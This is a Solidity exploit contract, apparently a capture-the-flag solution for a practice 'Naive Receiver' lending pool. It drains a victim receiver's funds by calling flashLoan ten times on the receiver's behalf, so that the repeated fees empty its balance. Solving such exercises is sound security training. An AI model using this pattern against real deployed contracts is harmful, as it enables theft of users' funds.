// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    
    NaiveReceiverLenderPool private immutable pool;
    address public receiver;

    constructor(address payable poolAddress, address _receiver) {
        pool = NaiveReceiverLenderPool(poolAddress);
        receiver = _receiver;
    }
    
    function drainAllReceiverFunds() public {
        for(uint i=0;i<10;i++) {
            pool.flashLoan(receiver, 1000 ether);
        }
    }
}